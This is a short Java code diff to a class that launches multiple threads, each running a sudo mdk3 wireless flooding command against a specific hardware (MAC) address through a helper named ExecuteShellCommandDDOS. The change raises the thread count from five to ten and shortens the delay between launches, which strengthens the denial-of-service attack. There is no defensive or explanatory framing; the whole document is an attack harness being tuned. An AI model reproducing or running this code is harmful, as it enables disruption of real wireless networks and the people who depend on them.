@@ -6,13 +6,13 @@ public class Runner {
 
 
 
-        long waitTime = (long) (1000*19);
-        int howMany =5;
+        long waitTime = (long) (1000);
+        int howMany =10;
         long howManyMinutes = 60000*1;
         Thread one;
         for (int i = 0; i < howMany ; i++) {
             one = new Thread(
-                   new ExecuteShellCommandDDOS("sudo mdk3 mon1 x 0 -t  F8:D1:11:41:B5:08 -n \"519\" -s 250",System.currentTimeMillis(),waitTime,howManyMinutes)
+                   new ExecuteShellCommandDDOS("sudo mdk3 mon1 x 0 -t  F8:D1:11:41:B5:08 -n \"519\" -s 150",System.currentTimeMillis(),waitTime,howManyMinutes)
             );
             one.start();
             for (int j = 0; j < 100000 ; j++) {}
